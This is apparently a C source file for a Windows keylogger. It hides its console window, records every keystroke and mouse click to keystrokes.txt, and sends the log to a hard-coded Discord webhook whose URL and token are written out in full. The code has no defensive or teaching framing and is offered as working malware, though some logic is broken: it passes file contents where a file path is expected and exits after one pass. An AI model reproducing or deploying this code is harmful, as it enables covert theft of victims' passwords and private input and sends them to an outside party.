#include <stdio.h>
#include <windows.h> // For Windows API functions
#include <winuser.h> // For Windows user input functions
#include <winuser.h> // For Windows virtual key codes
#include "curl/curl.h"

// Function to record keystrokes
void log_keystroke(char *key)
{
    FILE *file;
    file = fopen("keystrokes.txt", "a"); // Append mode
    if (file == NULL)
    {
        return;
    }
    fprintf(file, "%s", key);
    fclose(file);
}

int special_keys(int key_code)
{
    switch (key_code)
    {
    case VK_MENU:
        printf("[ALT]");
        log_keystroke("[ALT]");
        return 0;
    case VK_SPACE:
        printf(" ");
        log_keystroke(" ");
        return 0;
    case VK_RETURN:
        printf("\n");
        log_keystroke("\n");
        return 0;
    case VK_SHIFT:
        printf("[SHIFT]");
        log_keystroke("[SHIFT]");
        return 0;
    case VK_BACK:
        printf("[BACKSPACE]");
        log_keystroke("[BACKSPACE]");
        return 0;
    case VK_TAB:
        printf("[TAB]");
        log_keystroke("[TAB]");
        return 0;
    case VK_CAPITAL:
        printf("[CAPSLOCK]");
        log_keystroke("[CAPSLOCK]");
        return 0;
    case VK_CONTROL:
        printf("[CTRL]");
        log_keystroke("[CTRL]");
        return 0;
    case VK_ESCAPE:
        printf("[ESC]");
        log_keystroke("[ESC]");
        return 0;
    case VK_END:
        printf("[END]");
        log_keystroke("[END]");
        return 0;
    case VK_HOME:
        printf("[HOME]");
        log_keystroke("[HOME]");
        return 0;
    case VK_LEFT:
        printf("[LEFT]");
        log_keystroke("[LEFT]");
        return 0;
    case VK_UP:
        printf("[UP]");
        log_keystroke("[UP]");
        return 0;
    case VK_RIGHT:
        printf("[RIGHT]");
        log_keystroke("[RIGHT]");
        return 0;
    case VK_DOWN:
        printf("[DOWN]");
        log_keystroke("[DOWN]");
        return 0;
    case VK_DELETE:
        printf("[DEL]");
        log_keystroke("[DEL]");
        return 0;
    case VK_OEM_1:
        printf("[;:]");
        log_keystroke("[;:]");
        return 0;
    case VK_OEM_2:
        printf("[/?]");
        log_keystroke("[/?]");
        return 0;
    case VK_OEM_3:
        printf("[`~]");
        log_keystroke("[`~]");
        return 0;
    case VK_OEM_4:
        printf("[ [{ ]");
        log_keystroke("[ [{ ]");
        return 0;
    case VK_OEM_5:
        printf("[\\|]");
        log_keystroke("[\\|]");
        return 0;
    case VK_OEM_6:
        printf("[ ]}]");
        log_keystroke("[ ]}]");
        return 0;
    case VK_OEM_7:
        printf("['\"]");
        log_keystroke("['\"]");
        return 0;
    case VK_NUMPAD0:
        printf("0");
        log_keystroke("0");
        return 0;
    case VK_NUMPAD1:
        printf("1");
        log_keystroke("1");
        return 0;
    case VK_NUMPAD2:
        printf("2");
        log_keystroke("2");
        return 0;
    case VK_NUMPAD3:
        printf("3");
        log_keystroke("3");
        return 0;
    case VK_NUMPAD4:
        printf("4");
        log_keystroke("4");
        return 0;
    case VK_NUMPAD5:
        printf("5");
        log_keystroke("5");
        return 0;
    case VK_NUMPAD6:
        printf("6");
        log_keystroke("6");
        return 0;
    case VK_NUMPAD7:
        printf("7");
        log_keystroke("7");
        return 0;
    case VK_NUMPAD8:
        printf("8");
        log_keystroke("8");
        return 0;
    case VK_NUMPAD9:
        printf("9");
        log_keystroke("9");
        return 0;
    case VK_LBUTTON:
        printf("[LBUTTON]");
        log_keystroke("[LBUTTON]");
        return 0;
    case VK_RBUTTON:
        printf("[RBUTTON]");
        log_keystroke("[RBUTTON]");
        return 0;
    default:
        return 1;
    }
}

// Function to send a text file using Discord webhook
int sendTextToDiscordWebhook(const char* webhook_url, const char* file_path) {
    CURL *curl;
    CURLcode res;
    FILE *file;
    struct curl_slist *headers = NULL;

    // Initialize curl
    curl = curl_easy_init();
    if(curl) {
        // Open the file to send
        file = fopen(file_path, "rb");
        if (!file) {
            fprintf(stderr, "Failed to open file %s\n", file_path);
            return 1;
        }

        // Set up headers
        headers = curl_slist_append(headers, "Content-Type: application/json");

        // Set URL and options
        curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, file);

        // Perform the request
        res = curl_easy_perform(curl);

        // Check for errors
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                      curl_easy_strerror(res));

        // Clean up
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
        fclose(file);
    }

    return 0;
}

int main()
{
    // Hide the window
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    const char* webhook_url = "https://discord.com/api/webhooks/1259570024612499527/qatMvtdcKQY-XZXTlyTVyujr81e-rvV8rG_QW5Kiu6v6tf6hHCYKgJ0fflUceUp1V8jm";
    const char* file_path = "keystrokes.txt";
    while (1)
    {
        Sleep(10); // Sleep for 10 milliseconds to reduce CPU usage
        for (int key_code = 8; key_code <= 255; key_code++)
        {
            if (GetAsyncKeyState(key_code) == -32767)
            {
                if (special_keys(key_code) != 0)
                {
                    FILE *file;
                    file = fopen("keystrokes.txt", "a");
                    if (file == NULL)
                    {
                        return 1;
                    }
                    fprintf(file, "%c", key_code);
                    fclose(file);
                }
            }
        FILE *file1;
        file1 = fopen(file_path, "r");
        if (file1 == NULL) {
            fprintf(stderr, "Failed to open file %s\n", file_path);
            return 1;
        }

        // Read the contents of the file
        fseek(file1, 0, SEEK_END);
        long file_size = ftell(file1);
        fseek(file1, 0, SEEK_SET);
        char *file_contents = (char*)malloc(file_size + 1);
        fread(file_contents, 1, file_size, file1);
        file_contents[file_size] = '\0';

        // Send the file contents as text
        if (sendTextToDiscordWebhook(webhook_url, file_contents) != 0) {
            fprintf(stderr, "Failed to send file contents to Discord webhook.\n");
            return 1;
        }

        // Clean up
        fclose(file1);
        free(file_contents);

        printf("File sent successfully to Discord webhook.\n");
        return 0;  
        }
    }
    return 0;
}
